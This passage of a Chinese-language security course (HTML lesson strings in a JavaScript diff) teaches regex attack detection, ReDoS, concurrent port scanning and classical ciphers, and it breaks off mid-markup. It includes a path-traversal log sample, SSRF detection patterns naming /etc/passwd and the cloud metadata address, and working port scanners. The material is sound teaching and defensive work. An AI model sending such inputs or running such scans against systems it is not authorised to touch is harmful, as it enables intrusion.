[01/Jan/2024:10:00:00 +0800] \"GET /index.html HTTP/1.1\" 200 1234',\r\n    '10.0.0.2 - - [01/Jan/2024:10:00:01 +0800] \"POST /login HTTP/1.1\" 401 89',\r\n    '10.0.0.3 - - [01/Jan/2024:10:00:02 +0800] \"GET /admin/../../../etc/passwd HTTP/1.1\" 403 0',\r\n]\r\n\r\nfor line in sample_logs:\r\n    m = LOG_PATTERN.match(line)\r\n    if m:\r\n        d = m.groupdict()\r\n        print(f\"IP: {d['ip']:12s} | {d['method']:4s} {d['path'][:40]:40s} | {d['status']}\")</code></pre></div>\r\n\r\n<h3>WAF 规则：正则的双刃剑</h3>\r\n\r\n<div class=\"callout warn\">\r\n<div class=\"callout-title\">警告</div>\r\n<p>正则表达式用于 WAF（Web 应用防火墙）规则时，要特别注意 <strong>ReDoS（正则拒绝服务攻击）</strong>。某些正则模式在特定输入下会导致指数级的匹配时间，攻击者可以利用这一点让服务器瘫痪。</p>\r\n</div>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">import re\r\nimport time\r\n\r\n# ❌ 危险的 ReDoS 正则（嵌套量词）\r\nbad_pattern = re.compile(r\"^(a+)+$\")\r\n\r\n# 正常输入 — 很快\r\nt0 = time.time()\r\nbad_pattern.match(\"a\" * 20)\r\nprint(f\"正常输入: {time.time()-t0:.6f}s\")\r\n\r\n# 恶意输入 — 指数级时间！\r\n# bad_pattern.match(\"a\" * 25 + \"!\")  # 可能需要几秒甚至更久\r\n# 永远不要在生产环境中使用这种正则\r\n\r\n# ✅ 安全的写法\r\nsafe_pattern = re.compile(r\"^a+$\")\r\nt0 = time.time()\r\nsafe_pattern.match(\"a\" * 1000000)\r\nprint(f\"百万字符: {time.time()-t0:.6f}s\")  # 瞬间完成\r\n\r\n# ReDoS 检测规则：避免嵌套量词\r\n# (a+)+  → ❌ 嵌套\r\n# (a|a)+ → ❌ 重叠分支\r\n# (a*)*  → ❌ 嵌套\r\n# [a]+   → ✅ 字符类\r\n# a+     → ✅ 简单量词</code></pre></div>\r\n\r\n<div class=\"callout success\">\r\n<div class=\"callout-title\">动手试试</div>\r\n<p>给 AttackDetector 添加一个新的攻击类型检测：检测 SSRF（服务器端请求伪造）。匹配模式包括：<code>http://127.0.0.1</code>、<code>http://localhost</code>、<code>http://169.254.169.254</code>（云元数据）、<code>file:///etc/passwd</code>。</p>\r\n</div>\r\n\r\n<button class=\"practice-link-btn\" onclick=\"navigate('practice'); switchPractice(6)\">▶ 打开编程练习：正则表达式</button>\r\n\r\n<h3>IP 和邮箱验证正则</h3>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">import re\r\n\r\n# IP 地址验证（严格版）\r\nIP_PATTERN = re.compile(\r\n    r\"^(?:(?:25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)\\.){3}\"\r\n    r\"(?:25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)$\"\r\n)\r\n\r\ndef validate_ip(ip):\r\n    return bool(IP_PATTERN.match(ip))\r\n\r\n# 测试\r\nfor ip in [\"192.168.1.1\", \"999.0.0.1\", \"10.0.0.256\", \"0.0.0.0\"]:\r\n    print(f\"  {ip:15s} → {'有效' if validate_ip(ip) else '无效'}\")\r\n\r\n# 邮箱验证（简化版）\r\nEMAIL_PATTERN = re.compile(r\"^[\\w.+-]+@[\\w-]+\\.[\\w.]+$\")\r\n\r\ndef validate_email(email):\r\n    return bool(EMAIL_PATTERN.match(email))\r\n\r\n# URL 提取\r\nURL_PATTERN = re.compile(r\"https?://[^\\s<>\\\"']+\")\r\ntext = \"访问 https://example.com/path?q=1 或 http://test.com\"\r\nurls = URL_PATTERN.findall(text)\r\nprint(f\"找到 URL: {urls}\")</code></pre></div>\r\n\r\n<div class=\"checkpoint\" data-cp=\"2\"></div>\r\n\r\n<h3>本章小结</h3>\r\n<ul>\r\n<li>正则表达式是安全工程师的<strong>瑞士军刀</strong></li>\r\n<li>核心语法：<code>\\d \\w [] () *+? {} ^$ |</code></li>\r\n<li>安全应用：攻击检测、日志解析、输入验证</li>\r\n<li>警惕 <strong>ReDoS</strong>——避免嵌套量词</li>\r\n<li>完成了 <strong>攻击模式检测器</strong></li>\r\n</ul>\r\n\r\n\r\n<!-- ============================================================= -->";
+
+SECTION_CONTENT["prog-07"] = "<!-- ============================================================= -->\r\n\r\n<h2>线程、协程与异步 I/O</h2>\r\n<h3>prog-07 · 并发与异步 · 让扫描器飞起来</h3>\r\n\r\n<div class=\"section-transition\">\r\n<p>上一章我们学了<strong>正则表达式</strong>——安全工具的模式匹配利器。现在回到性能问题：你的端口扫描器扫描 1000 个端口需要等很久，因为它是<strong>串行</strong>的——一个端口等完再扫下一个。如果 1000 个端口能同时扫描呢？本章我们学习<strong>并发编程</strong>。</p>\r\n</div>\r\n\r\n<div class=\"callout default\">\r\n<div class=\"callout-title\">🎯 本章场景</div>\r\n<p>导师说：\"扫描一个 /24 子网的 254 台主机的 1000 个端口，串行要等几个小时。用并发，几分钟搞定。\" 你需要学会三种并发方式：<strong>多线程</strong>、<strong>多进程</strong>和<strong>异步 I/O</strong>。</p>\r\n</div>\r\n\r\n<h3>为什么需要并发？</h3>\r\n\r\n<p>端口扫描的主要瓶颈是<strong>等待</strong>——等待网络连接、等待超时。在等待的时候，CPU 是空闲的。并发让你在等待的同时做其他事情。</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">import time\r\nimport socket\r\n\r\ndef scan_port_slow(ip, port, timeout=1.0):\r\n    \"\"\"单个端口扫描（阻塞式）\"\"\"\r\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n    sock.settimeout(timeout)\r\n    try:\r\n        sock.connect((ip, port))\r\n        sock.close()\r\n        return True\r\n    except:\r\n        sock.close()\r\n        return False\r\n\r\n# 串行扫描 100 个端口（很慢！）\r\ntarget = \"scanme.nmap.org\"\r\nports = list(range(1, 101))\r\n\r\nt0 = time.time()\r\nopen_ports = []\r\nfor port in ports:\r\n    if scan_port_slow(target, port):\r\n        open_ports.append(port)\r\nserial_time = time.time() - t0\r\nprint(f\"串行: {len(open_ports)} 个开放端口, 耗时 {serial_time:.1f}s\")</code></pre></div>\r\n\r\n<div class=\"checkpoint\" data-cp=\"0\"></div>\r\n\r\n<h3>多线程：threading</h3>\r\n\r\n<p>多线程适合 I/O 密集型任务（网络扫描、文件读写）。Python 的 GIL 限制了 CPU 并行，但对等待网络响应没影响。</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">\"\"\"多线程端口扫描器\"\"\"\r\nimport socket\r\nimport threading\r\nimport time\r\nfrom concurrent.futures import ThreadPoolExecutor\r\n\r\ndef scan_port(ip, port, timeout=1.0):\r\n    \"\"\"扫描单个端口\"\"\"\r\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n    sock.settimeout(timeout)\r\n    try:\r\n        sock.connect((ip, port))\r\n        sock.close()\r\n        return port, True\r\n    except:\r\n        sock.close()\r\n        return port, False\r\n\r\ndef threaded_scan(target_ip, ports, max_workers=50, timeout=1.0):\r\n    \"\"\"多线程扫描\"\"\"\r\n    print(f\"[*] 多线程扫描 {target_ip} ({len(ports)} 端口, {max_workers} 线程)\")\r\n    t0 = time.time()\r\n    open_ports = []\r\n\r\n    with ThreadPoolExecutor(max_workers=max_workers) as executor:\r\n        # 提交所有任务\r\n        futures = {\r\n            executor.submit(scan_port, target_ip, port, timeout): port\r\n            for port in ports\r\n        }\r\n\r\n        # 收集结果\r\n        for future in futures:\r\n            port, is_open = future.result()\r\n            if is_open:\r\n                open_ports.append(port)\r\n\r\n    elapsed = time.time() - t0\r\n    open_ports.sort()\r\n    print(f\"[*] 完成: {len(open_ports)} 个开放端口 {open_ports}, 耗时 {elapsed:.1f}s\")\r\n    return open_ports\r\n\r\n# 对比测试\r\ntarget = \"scanme.nmap.org\"\r\nports = list(range(1, 101))\r\n\r\n# 串行\r\nt0 = time.time()\r\nserial_open = [p for p in ports if scan_port(target, p)[1]]\r\nprint(f\"串行: {time.time()-t0:.1f}s → {len(serial_open)} 开放\")\r\n\r\n# 多线程\r\nthreaded_open = threaded_scan(target, ports, max_workers=50)</code></pre></div>\r\n\r\n<div class=\"callout info\">\r\n<div class=\"callout-title\">提示</div>\r\n<p><code>ThreadPoolExecutor</code> 是最简洁的多线程方式。<code>max_workers</code> 控制并发数——太多线程会耗尽系统资源。网络扫描通常 50-200 个线程就够了。</p>\r\n</div>\r\n\r\n<div class=\"checkpoint\" data-cp=\"1\"></div>\r\n\r\n<h3>异步 I/O：asyncio</h3>\r\n\r\n<p>异步 I/O 是 Python 处理并发的现代方式——比多线程更轻量，单线程内就能管理数千个并发连接。</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">\"\"\"异步端口扫描器\"\"\"\r\nimport asyncio\r\nimport time\r\n\r\nasync def async_scan_port(ip, port, timeout=1.0):\r\n    \"\"\"异步扫描单个端口\"\"\"\r\n    try:\r\n        # asyncio 原生支持异步网络连接\r\n        _, writer = await asyncio.wait_for(\r\n            asyncio.open_connection(ip, port),\r\n            timeout=timeout\r\n        )\r\n        writer.close()\r\n        await writer.wait_closed()\r\n        return port, True\r\n    except (asyncio.TimeoutError, ConnectionRefusedError, OSError):\r\n        return port, False\r\n\r\nasync def async_scan(target_ip, ports, max_concurrent=100, timeout=1.0):\r\n    \"\"\"异步批量扫描\"\"\"\r\n    print(f\"[*] 异步扫描 {target_ip} ({len(ports)} 端口, 并发 {max_concurrent})\")\r\n    t0 = time.time()\r\n\r\n    # 信号量控制并发数\r\n    sem = asyncio.Semaphore(max_concurrent)\r\n\r\n    async def limited_scan(port):\r\n        async with sem:\r\n            return await async_scan_port(target_ip, port, timeout)\r\n\r\n    # 创建所有任务\r\n    tasks = [asyncio.create_task(limited_scan(port)) for port in ports]\r\n\r\n    # 等待所有完成\r\n    results = await asyncio.gather(*tasks)\r\n\r\n    open_ports = sorted(port for port, is_open in results if is_open)\r\n    elapsed = time.time() - t0\r\n    print(f\"[*] 完成: {len(open_ports)} 个开放端口 {open_ports}, 耗时 {elapsed:.1f}s\")\r\n    return open_ports\r\n\r\n# 运行\r\n# asyncio.run(async_scan(\"scanme.nmap.org\", range(1, 101)))</code></pre></div>\r\n\r\n<h3>三种并发方式对比</h3>\r\n\r\n<table>\r\n<thead><tr><th>方式</th><th>适用场景</th><th>优点</th><th>缺点</th></tr></thead>\r\n<tbody>\r\n<tr><td>多线程</td><td>I/O 密集（网络扫描）</td><td>简单直接</td><td>线程开销、GIL 限制</td></tr>\r\n<tr><td>多进程</td><td>CPU 密集（密码破解）</td><td>真正并行</td><td>内存占用大</td></tr>\r\n<tr><td>asyncio</td><td>大量 I/O（大规模扫描）</td><td>最轻量、最高并发</td><td>需要 async 生态</td></tr>\r\n</tbody>\r\n</table>\r\n\r\n<h3>异步 Web 日志分析器</h3>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">\"\"\"异步批量 HTTP 检查器\"\"\"\r\nimport asyncio\r\n\r\nasync def check_url(url, timeout=5.0):\r\n    \"\"\"异步检查 URL 是否可达\"\"\"\r\n    try:\r\n        reader, writer = await asyncio.wait_for(\r\n            asyncio.open_connection(url.split(\"/\")[2], 80),\r\n            timeout=timeout\r\n        )\r\n        request = f\"HEAD / HTTP/1.0\\r\\nHost: {url.split('/')[2]}\\r\\n\\r\\n\"\r\n        writer.write(request.encode())\r\n        await writer.drain()\r\n        response = await reader.read(1024)\r\n        writer.close()\r\n        status = response.decode(errors=\"ignore\").split(\" \")[1] if response else \"?\"\r\n        return url, status, None\r\n    except Exception as e:\r\n        return url, None, str(e)\r\n\r\nasync def batch_check(urls, max_concurrent=20):\r\n    \"\"\"批量异步检查\"\"\"\r\n    sem = asyncio.Semaphore(max_concurrent)\r\n\r\n    async def limited(url):\r\n        async with sem:\r\n            return await check_url(url)\r\n\r\n    tasks = [asyncio.create_task(limited(url)) for url in urls]\r\n    results = await asyncio.gather(*tasks)\r\n\r\n    for url, status, error in results:\r\n        if status:\r\n            print(f\"  ✅ {url} → {status}\")\r\n        else:\r\n            print(f\"  ❌ {url} → {error}\")\r\n\r\n# asyncio.run(batch_check([\r\n#     \"http://example.com\",\r\n#     \"http://scanme.nmap.org\",\r\n# ]))</code></pre></div>\r\n\r\n<div class=\"callout warn\">\r\n<div class=\"callout-title\">警告</div>\r\n<p>异步编程中常见的坑：忘记 <code>await</code>、在异步函数中调用阻塞函数（如 <code>time.sleep</code>，应该用 <code>await asyncio.sleep</code>）、忘记限制并发数导致被目标服务器封禁。</p>\r\n</div>\r\n\r\n<div class=\"callout success\">\r\n<div class=\"callout-title\">动手试试</div>\r\n<p>给异步扫描器添加进度条：用 <code>asyncio.as_completed()</code> 替代 <code>gather()</code>，每完成一个端口就更新进度显示。</p>\r\n</div>\r\n\r\n<div class=\"checkpoint\" data-cp=\"2\"></div>\r\n\r\n<h3>线程安全：共享数据的陷阱</h3>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">\"\"\"线程安全示例\"\"\"\r\nimport threading\r\n\r\n# ❌ 不安全：多线程写入共享字典\r\nresults_unsafe = {}\r\n\r\ndef unsafe_scan(port):\r\n    # 多个线程同时写入可能丢失数据\r\n    results_unsafe[port] = \"open\"\r\n\r\n# ✅ 安全：用锁保护\r\nresults_safe = {}\r\nlock = threading.Lock()\r\n\r\ndef safe_scan(port):\r\n    with lock:  # 同一时间只有一个线程进入\r\n        results_safe[port] = \"open\"\r\n\r\n# ✅ 更好：用线程安全的数据结构\r\nfrom collections import defaultdict\r\nimport queue\r\n\r\nresult_queue = queue.Queue()  # 线程安全队列\r\n\r\ndef queue_scan(port):\r\n    # 模拟扫描...\r\n    result_queue.put((port, \"open\"))\r\n\r\n# 收集结果\r\n# while not result_queue.empty():\r\n#     port, status = result_queue.get()</code></pre></div>\r\n\r\n<div class=\"checkpoint\" data-cp=\"3\"></div>\r\n\r\n<h3>本章小结</h3>\r\n<ul>\r\n<li><strong>多线程</strong>适合 I/O 密集型任务（网络扫描）</li>\r\n<li><strong>asyncio</strong> 是处理大量并发连接的最佳方案</li>\r\n<li>并发数需要控制——太多会被封禁</li>\r\n<li>共享数据需要<strong>锁</strong>保护</li>\r\n<li>完成了<strong>异步端口扫描器</strong>——性能提升数十倍</li>\r\n</ul>\r\n\r\n<p>恭喜你完成了整个\"编程基础\"模块！你已经从零构建了：Banner Grabber、端口扫描器、日志分析器、Hex Dump 工具、攻击检测器，还学会了用并发提升性能。这些就是安全工程师的编程基本功。</p>";
+
+SECTION_CONTENT["cryptography"] = "<section id=\"cryptography\" class=\"section\" data-key=\"cryptography\">\r\n<div class=\"section-transition\"><p>编程基础让我们掌握了工具箱。现在进入密码学世界——数学和代码交织，保护着互联网上每一次通信。旅程从<strong>凯撒密码</strong>开始。</p></div>\r\n<div class=\"section-header\">\r\n  <span class=\"chapter-tag\">crypto-01 · 古典密码</span>\r\n  <h1>凯撒密码与频率分析</h1>\r\n  <p class=\"subtitle\">两千年前的军事机密，如何被一张字母频率表破解？</p>\r\n</div>\r\n\r\n<h2>一、历史场景：高卢战记中的秘密</h2>\r\n<p>公元前 58 年，尤利乌斯·凯撒正率军征服高卢。前线将领急需密令，但信使可能被俘。凯撒想出一个简单却天才的方案：把信件中每个字母<strong>向后移动 3 位</strong>。A 变成 D，B 变成 E……X 变成 A，Y 变成 B，Z 变成 C。</p>\r\n<p>例如 \"ATTACK\" 加密后变成 \"DWWDFN\"。敌人截获信件，看到的只是一串毫无意义的字符。</p>\r\n\r\n<div class=\"callout info\"><div class=\"callout-title\">历史小知识</div><p>凯撒的侄子奥古斯都也使用类似方法，但偏移量为 1。历史上这类\"移位替换\"密码统称为<strong>凯撒密码（Caesar Cipher）</strong>。</p></div>\r\n\r\n<h2>二、凯撒密码的数学表达</h2>\r\n<p>我们用数字 0-25 代表 A-Z。凯撒加密和解密可以用两个极简公式描述：</p>\r\n<p><strong>加密：</strong> C = (P + k) mod 26</p>\r\n<p><strong>解密：</strong> P = (C - k) mod 26</p>\r\n<p>其中 P 是明文字母编号，C 是密文字母编号，k 是偏移量（凯撒用 k=3）。</p>\r\n<p>这个 <code>mod 26</code> 是关键——它让字母表\"循环\"。当 Z（25）+ 3 = 28 时，28 mod 26 = 2，也就是 C。数学的优雅就在这里。</p>\r\n\r\n<h2>三、动手实现：Python 版凯撒密码</h2>\r\n<p>让我们写一个完整的加密/解密程序：</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">def caesar_encrypt(plaintext, key):\r\n    \"\"\"凯撒加密：plaintext 为明文，key 为偏移量\"\"\"\r\n    result = []\r\n    for ch in plaintext:\r\n        if ch.isalpha():\r\n            base = ord('A')\r\n            shifted = (ord(ch.upper()) - base + key) % 26\r\n            result.append(chr(base + shifted))\r\n        else:\r\n            result.append(ch)\r\n    return ''.join(result)\r\n\r\ndef caesar_decrypt(ciphertext, key):\r\n    \"\"\"凯撒解密\"\"\"\r\n    return caesar_encrypt(ciphertext, -key)\r\n\r\n# 测试\r\nmessage = \"ATTACK AT DAWN\"\r\nencrypted = caesar_encrypt(message, 3)\r\nprint(f\"明文: {message}\")\r\nprint(f\"密文: {encrypted}\")\r\nprint(f\"解密: {caesar_decrypt(encrypted, 3)}\")\r\n# 输出:\r\n# 明文: ATTACK AT DAWN\r\n# 密文: DWWDFN DW GDZQ\r\n# 解密: ATTACK AT DAWN</code></pre></div>\r\n\r\n<div class=\"checkpoint\" data-cp=\"0\"></div>\r\n\r\n<h2>四、暴力破解：26 种可能</h2>\r\n<p>凯撒密码的致命弱点：<strong>密钥空间只有 25 种有效偏移</strong>（k=0 等于不加密）。即使不知道密钥，我们也可以穷举所有可能：</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">def brute_force_caesar(ciphertext):\r\n    \"\"\"暴力破解凯撒密码：尝试所有 26 种偏移\"\"\"\r\n    print(f\"密文: {ciphertext}\\n\")\r\n    for key in range(26):\r\n        decrypted = caesar_decrypt(ciphertext, key)\r\n        print(f\"k={key:2d}: {decrypted}\")\r\n\r\n# 截获一段密文\r\nintercepted = \"WKLV LV D VHFUHW PHVVDJH\"\r\nbrute_force_caesar(intercepted)</code></pre></div>\r\n\r\n<p>运行后你会看到 26 行结果，其中 k=3 时出现 \"THIS IS A SECRET MESSAGE\"——一眼就能认出明文。整个破解过程不超过 1 秒。</p>\r\n\r\n<div class=\"callout warn\"><div class=\"callout-title\">安全启示</div><p>密钥空间太小是凯撒密码的根本缺陷。25 种可能在古罗马时代也许够用（毕竟大部分敌人不识字），但在计算机面前不堪一击。这是密码学的第一条铁律：<strong>密钥空间必须足够大</strong>。</p></div>\r\n\r\n<h2>五、频率分析：更优雅的破解</h2>\r\n<p>假设偏移量更大、密文更长，暴力破解虽然可行，但还有更聪明的方法——<strong>频率分析</strong>。</p>\r\n\r\n<h3>5.1 字母频率：语言的指纹</h3>\r\n<p>每种语言都有独特的字母使用频率。英语中：</p>\r\n<ul>\r\n  <li><strong>E</strong> 出现最多，约占 12.7%</li>\r\n  <li>T、A、O、I、N 紧随其后，各占 6-9%</li>\r\n  <li>Z、Q、X 最少见，各不足 0.2%</li>\r\n</ul>\r\n<p>凯撒密码只是把字母整体平移，<strong>频率分布的形状不变</strong>。密文中出现最多的字母，对应的就是明文中出现最多的字母（英语中通常是 E）。</p>\r\n\r\n<h3>5.2 频率分析破解代码</h3>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">from collections import Counter\r\n\r\ndef frequency_attack(ciphertext):\r\n    \"\"\"基于字母频率的凯撒密码破解\"\"\"\r\n    letters = [ch.upper() for ch in ciphertext if ch.isalpha()]\r\n    if not letters:\r\n        return \"密文中没有字母\"\r\n\r\n    freq = Counter(letters)\r\n    most_common = freq.most_common(1)[0][0]\r\n\r\n    key = (ord(most_common) - ord('E')) % 26\r\n    decrypted = caesar_decrypt(ciphertext, key)\r\n\r\n    print(f\"密文中最高频字母: {most_common}\")\r\n    print(f\"推测偏移量: {key}\")\r\n    print(f\"解密结果: {decrypted}\")\r\n    return key, decrypted\r\n\r\nlong_cipher = \"WKLVLV DORQJ HUWHAW ZKLFK PDNHV IUHTX HQFBD QDOBV LVZRUNZHOO\"\r\nfrequency_attack(long_cipher)</code></pre></div>\r\n\r\n<h3>5.3 更精确的频率匹配</h3>\r\n<p>对于短文本，最高频字母可能不是 E。更鲁棒的方法是计算<strong>卡方统计量</strong>，比较密文频率分布与标准英语频率分布的\"距离\"：</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">ENGLISH_FREQ = {\r\n    'A': 0.08167, 'B': 0.01492, 'C': 0.02782, 'D': 0.04253,\r\n    'E': 0.12702, 'F': 0.02228, 'G': 0.02015, 'H': 0.06094,\r\n    'I': 0.06966, 'J': 0.00153, 'K': 0.00772, 'L': 0.04025,\r\n    'M': 0.02406, 'N': 0.06749, 'O': 0.07507, 'P': 0.01929,\r\n    'Q': 0.00095, 'R': 0.05987, 'S': 0.06327, 'T': 0.09056,\r\n    'U': 0.02758, 'V': 0.00978, 'W': 0.02360, 'X': 0.00150,\r\n    'Y': 0.01974, 'Z': 0.00074\r\n}\r\n\r\ndef chi_squared(text, key):\r\n    \"\"\"计算偏移 key 解密后的卡方值\"\"\"\r\n    decrypted = caesar_decrypt(text, key)\r\n    letters = [ch for ch in decrypted.upper() if ch.isalpha()]\r\n    n = len(letters)\r\n    if n == 0:\r\n        return float('inf')\r\n    count = Counter(letters)\r\n    chi2 = 0\r\n    for letter, expected_freq in ENGLISH_FREQ.items():\r\n        observed = count.get(letter, 0)\r\n        expected = n * expected_freq\r\n        if expected > 0:\r\n            chi2 += (observed - expected) ** 2 / expected\r\n    return chi2\r\n\r\ndef best_chi2_attack(ciphertext):\r\n    \"\"\"用卡方检验找最优偏移量\"\"\"\r\n    best_key, best_score = 0, float('inf')\r\n    for key in range(26):\r\n        score = chi_squared(ciphertext, key)\r\n        if score < best_score:\r\n            best_score, best_key = score, key\r\n    print(f\"最优偏移量: {best_key} (卡方值: {best_score:.2f})\")\r\n    print(f\"解密结果: {caesar_decrypt(ciphertext, best_key)}\")\r\n    return best_key</code></pre></div>\r\n\r\n<div class=\"checkpoint\" data-cp=\"1\"></div>\r\n\r\n<h2>六、凯撒密码的变体与延伸</h2>\r\n\r\n<h3>6.1 ROT13：互联网的\"简易遮挡\"</h3>\r\n<p>ROT13 是凯撒密码的特例，k=13。因为英文字母共 26 个，加密和解密操作完全相同——再 ROT13 一次就恢复原文。</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">import codecs\r\ntext = \"The answer is 42\"\r\nrot13 = codecs.encode(text, 'rot_13')\r\nprint(f\"ROT13: {rot13}\")       # Gur nafjre vf 42\r\nprint(f\"还原: {codecs.encode(rot13, 'rot_13')}\")  # The answer is 42</code></pre></div>\r\n\r\n<h3>6.2 仿射密码：多一点数学</h3>\r\n<p>仿射密码把凯撒的\"加一个常数\"升级为\"乘一个系数再加一个常数\"：C = (a × P + b) mod 26。其中 a 必须与 26 互素（gcd(a, 26) = 1），否则无法解密。密钥空间为 12 × 26 = 312 种，依然不堪一击。</p>\r\n\r\n<div class=\"callout default\"><div class=\"callout-title\">思考</div><p>为什么 a 必须与 26 互素？因为解密需要计算 a 的<strong>模逆元</strong>——如果 gcd(a,26) ≠ 1，模逆元不存在，多个明文会映射到同一个密文，无法唯一还原。</p></div>\r\n\r\n<h2>七、单表替换密码：凯撒的\"终极进化\"</h2>\r\n<p>如果不用固定偏移，而是把 26 个字母<strong>任意打乱</strong>映射呢？这就是<strong>单表替换密码（Monoalphabetic Substitution）</strong>。密钥空间 = 26! ≈ 4 × 10<sup>26</sup>，暴力破解不可能。</p>\r\n<p>然而，<strong>频率分析依然有效</strong>。因为每个字母始终被替换为同一个密文字母，语言中的频率特征被完整保留。阿拉伯学者 Al-Kindi 在公元 9 世纪就已经用这种方法破解替换密码了。</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">import random, string\r\n\r\ndef generate_substitution_key():\r\n    \"\"\"生成随机替换表\"\"\"\r\n    letters = list(string.ascii_uppercase)\r\n    shuffled = letters.copy()\r\n    random.shuffle(shuffled)\r\n    return dict(zip(letters, shuffled))\r\n\r\ndef substitution_encrypt(plaintext, key_map):\r\n    result = []\r\n    for ch in plaintext:\r\n        upper = ch.upper()\r\n        result.append(key_map.get(upper, ch))\r\n    return ''.join(result)\r\n\r\nkey = generate_substitution_key()\r\nprint(f\"替换表: {key}\")\r\ncipher = substitution_encrypt(\"FREQUENCY ANALYSIS BREAKS THIS\", key)\r\nprint(f\"密文: {cipher}\")</code></pre></div>\r\n\r\n<div class=\"checkpoint\" data-cp=\"2\"></div>\r\n\r\n<h2>八、从古典到现代：凯撒密码留下的教训</h2>\r\n<p>凯撒密码虽然古老，但它揭示了密码学设计中的核心矛盾：</p>\r\n<ul>\r\n  <li><strong>安全性 vs. 实用性</strong>：越安全的系统越复杂</li>\r\n  <li><strong>密钥空间</strong>：必须大到无法穷举</li>\r\n  <li><strong>模式隐藏</strong>：不能泄露明文的统计特征</li>\r\n</ul>\r\n<p>现代密码算法（如 AES）本质上仍在解决这三个问题，只是手段从手工替换进化到了复杂的数学运算和计算机实现。</p>\r\n\r\n<div class=\"callout success\"><div class=\"callout-title\">本节总结</div>\r\n<ul>\r\n  <li>凯撒密码 = 字母表平移，密钥空间仅 25 种</li>\r\n  <li>频率分析利用语言统计特征破解替换类密码</li>\r\n  <li>单表替换密钥空间虽大（26!），但频率特征暴露无遗</li>\r\n  <li>密码学的核心挑战：隐藏模式、扩大密钥空间</li>\r\n</ul></div>\r\n\r\n<button class=\"practice-link-btn\" onclick=\"navigate('practice'); switchPractice(0)\">▶ 凯撒密码破解</button>\r\n<button class=\"practice-link-btn\" onclick=\"navigate('ctf'); openCTF(0)\">▶ 经典凯撒</button>\r\n</section>";
+
+SECTION_CONTENT["crypto-01-02"] = "<section id=\"crypto-01-02\" class=\"section\" data-key=\"crypto-01-02\">\r\n<div class=\"section-transition\"><p>凯撒密码和单表替换都败给了频率分析。原因很简单：<strong>每个字母始终被替换成同一个字符</strong>。如果让同一个字母在不同位置对应不同的密文呢？这就是维吉尼亚密码的革命性思路。</p></div>\r\n<div class=\"section-header\">\r\n  <span class=\"chapter-tag\">crypto-01 · 古典密码</span>\r\n  <h1>维吉尼亚密码与 Kasiski 试验</h1>\r\n  <p class=\"subtitle\">\"不可破解的密码\"如何统治了三百年？</p>\r\n</div>\r\n\r\n<h2>一、\"不可破解\"的传奇</h2>\r\n<p>1553 年，意大利学者 Giovan Battista Bellaso 首次描述了多表替换的概念。随后法国外交官 Blaise de Vigenère 在 1586 年发表了改进版本。维吉尼亚密码此后被称为 <strong>\"le chiffre indéchiffrable\"（不可破解的密码）</strong>，统治欧洲外交通信近三百年。直到 1854 年，Charles Babbage 和 Friedrich Kasiski 各自独立发现了破解方法。</p>\r\n\r\n<h2>二、工作原理：多个凯撒密码的叠加</h2>\r\n<p>维吉尼亚密码的核心思想：用一个<strong>关键词</strong>（keyword），对明文的不同字母使用不同的偏移量。</p>\r\n<p>例如关键词 <code>KEY</code>：K=偏移10, E=偏移4, Y=偏移24。加密 \"HELLO WORLD\" 时，密钥循环使用，两个 L 被加密成不同的密文字母（J 和 V）——这就是\"多表替换\"的威力。</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">def vigenere_encrypt(plaintext, keyword):\r\n    \"\"\"维吉尼亚加密\"\"\"\r\n    keyword = keyword.upper()\r\n    key_len = len(keyword)\r\n    result, key_index = [], 0\r\n    for ch in plaintext:\r\n        if ch.isalpha():\r\n            shift = ord(keyword[key_index % key_len]) - ord('A')\r\n            encrypted = (ord(ch.upper()) - ord('A') + shift) % 26\r\n            result.append(chr(ord('A') + encrypted))\r\n            key_index += 1\r\n        else:\r\n            result.append(ch)\r\n    return ''.join(result)\r\n\r\ndef vigenere_decrypt(ciphertext, keyword):\r\n    \"\"\"维吉尼亚解密\"\"\"\r\n    keyword = keyword.upper()\r\n    key_len = len(keyword)\r\n    result, key_index = [], 0\r\n    for ch in ciphertext:\r\n        if ch.isalpha():\r\n            shift = ord(keyword[key_index % key_len]) - ord('A')\r\n            decrypted = (ord(ch.upper()) - ord('A') - shift) % 26\r\n            result.append(chr(ord('A') + decrypted))\r\n            key_index += 1\r\n        else:\r\n            result.append(ch)\r\n    return ''.join(result)\r\n\r\nmsg, key = \"HELLO WORLD\", \"KEY\"\r\nenc = vigenere_encrypt(msg, key)\r\nprint(f\"明文: {msg}\\n密文: {enc}\\n解密: {vigenere_decrypt(enc, key)}\")</code></pre></div>\r\n\r\n<div class=\"checkpoint\" data-cp=\"0\"></div>\r\n\r\n<h2>三、为什么频率分析失效？</h2>\r\n<p>在维吉尼亚密码中，同一个字母 E 在不同位置用不同偏移加密，频率被<strong>分散</strong>到多个密文字母上。密文频率分布变得平坦，标准频率分析完全失效。</p>\r\n\r\n<h2>四、Kasiski 试验：破解的第一步</h2>\r\n<p>维吉尼亚密码的结构性弱点：<strong>密钥循环重复</strong>。如果明文中有重复文字且位置差是密钥长度的倍数，密文中也会出现对应重复。</p>\r\n\r\n<div class=\"code-block\"><div 